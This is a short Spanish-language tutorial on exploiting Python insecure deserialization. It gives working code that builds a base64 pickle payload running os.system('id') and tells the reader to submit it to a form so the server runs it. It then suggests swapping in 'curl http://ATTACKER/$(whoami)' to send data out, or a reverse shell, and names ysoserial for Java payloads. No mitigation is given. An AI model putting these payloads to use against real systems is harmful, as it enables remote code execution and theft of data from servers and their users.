¿Qué es la deserialización insegura?

  1. Python's pickle.loads() ejecuta código Python arbitrario al deserializar objetos.
  2. Crea un payload malicioso que ejecute un comando del sistema:
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
  1. Envía el payload al formulario. El servidor ejecutará os.system('id').
  2. Cambia 'id' por cualquier comando: 'curl http://ATTACKER/$(whoami)', reverse shell, etc.
  3. Genera payload con ysoserial (Java) o scripts similares para otros lenguajes.
